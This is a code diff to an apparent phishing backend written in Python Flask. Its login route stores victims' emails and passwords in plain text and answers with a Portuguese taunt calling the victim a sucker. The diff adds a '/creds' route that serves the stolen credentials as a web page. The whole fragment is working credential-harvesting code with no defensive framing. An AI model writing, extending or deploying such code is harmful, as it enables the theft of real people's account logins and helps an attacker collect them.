@@ -14,5 +14,10 @@ def login():
         f.write(f'Email: {email}, Senha: {password}\n')
     return 'Login recebido, trouxa!'
 
+@app.route('/creds')
+def show_creds():
+    with open('creds.txt', 'r') as f:
+        return '<pre>' + f.read() + '</pre>'
+
 if __name__ == '__main__':
     app.run(debug=True)
